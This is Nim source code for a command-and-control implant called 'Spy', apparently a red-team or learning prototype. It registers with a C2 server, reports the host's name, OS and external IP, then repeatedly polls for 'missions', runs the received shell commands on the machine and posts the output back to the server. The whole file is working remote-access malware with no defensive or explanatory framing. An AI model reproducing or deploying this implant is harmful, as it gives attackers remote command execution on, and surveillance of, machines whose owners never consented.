import winim/com
import httpclient, asyncdispatch, os, strutils, times
import sysinfo
import osproc
import marshal
import std/json

type Spy = ref object
 id: int
 guid: string
 active: bool
 intaddr: string
 extaddr: string
 username: string
 hostname: string
 ops: string
 pid: int
 mission: string
 interval: int
 jitter: int
 firstcheckin: string
 lastcheckin: string


type Command = ref object
 mission_id: int
 command: string



proc initialCheckin(spy: Spy, intaddr: string, extaddr: string, username: string, hostname: string, ops: string, pid: int, server: string):Future[void] {.async.} =
 spy.active = true
 spy.intaddr = intaddr
 spy.extaddr = extaddr
 spy.username = username
 spy.hostname = hostname
 spy.ops = ops
 spy.pid = pid
 var data = %*{
  "active": $spy.active,
  "intaddr": $spy.intaddr,
  "extaddr": $spy.extaddr,
  "username": $spy.username,
  "hostname": $spy.hostname,
  "ops": $spy.ops,
  "pid": $spy.pid
  }
 var client = newAsyncHttpClient()
 var response = await client.post(server & "/register", body = $data)
 var responseText = parseJson(await response.body)
 echo responseText
 spy.id =responseText["id"].getInt
 spy.guid = responseText["guid"].getStr
 spy.active = true

proc getEnv(spy: Spy, server: string): Future[void] {.async} = 
 let
  ops = getOsName()
  username = "administrator"
  pid = 12345
  hostname = getMachineName()
  client = newAsyncHttpClient()
  extaddr = await getContent(client, "http://ident.me")
  intaddr = "127.0.0.1"
 await spy.initialCheckin(intaddr, extaddr, username, hostname, ops, pid, server)
 echo "[+] Connected to the C2 Server"
 echo "[+] Spy GUID " & spy.guid



proc cmdShell(command: string): Future[string] {.async} =
 let output = execProcess(command)
 echo output
 return output

proc checkin(spy: Spy, server: string): Future[string] {.async} =
 var client = newAsyncHttpClient()
 var response = await client.get(server & "/spy/" & $spy.id)
 var responseText = parseJson(await response.body)
 return $responseText


proc isCommandInList(cmd: Command, cmdList: seq[Command]): bool =
 for item in cmdList:
  if item.missionId == cmd.missionId:
   return true
 return false


proc main() {.async.} =
 let server = "http://localhost:8000"
 var newspy = Spy()
 await getEnv(newspy, server)
 var cmdobjlist = newSeq[Command]()
 while true:
  var spy_data = await check_in(newspy, server)
  var spy_data_json = parseJson(spy_data)
  for mission in spy_data_json["missionlist"].getElems():
   if not mission["iscompleted"].getBool():
    var cmdobj = Command(missionid: mission["id"].getInt(), command: mission["command"].getStr())
    if not isCommandInList(cmdobj, cmdobjlist):
     echo "Mission id " & $cmdobj.missionid & "Mission command " & $cmdobj.command
     cmdobjlist.add(cmdobj)
  if cmdobjlist.len > 0:
   for i in 0 .. (cmdobjlist.len-1):
    var cmdobj = cmdobjlist[i]
    var cmdpart = cmdobj.command
    var cmd_maincmd = cmdpart.substr(0, cmdpart.find(' ')-1)
    var cmd_subcmd = cmdpart.substr(cmdpart.find(' ')+1)
    var result=""
    if cmd_maincmd == "shell":
     result = await cmdShell(cmd_subcmd)
    var client = newAsyncHttpClient()
    var data = %*{
     "output": result
     }
    discard await client.post(server & "/spy/" & $newspy.id & "/" & $cmdObj.missionId & "/output", 
                          body = $data)
    cmdobjlist.del(i)
    break
  await sleepAsync(3000)



waitFor main()
